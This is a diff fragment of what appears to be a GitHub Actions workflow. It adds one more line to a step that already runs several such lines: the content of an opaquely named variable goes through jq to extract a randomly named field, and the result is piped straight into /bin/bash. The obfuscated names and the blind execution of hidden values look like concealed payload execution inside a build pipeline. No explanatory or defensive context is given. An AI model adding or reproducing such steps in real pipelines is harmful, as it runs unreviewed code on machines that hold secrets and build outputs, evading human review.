@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$m16641" | jq -r .lrst35 | /bin/bash
           echo $ary03 | jq -r .s4 | /bin/bash
           echo $zl9316 | jq -r .jnxrz50878 | /bin/bash
+          echo $ck297 | jq -r .o5 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
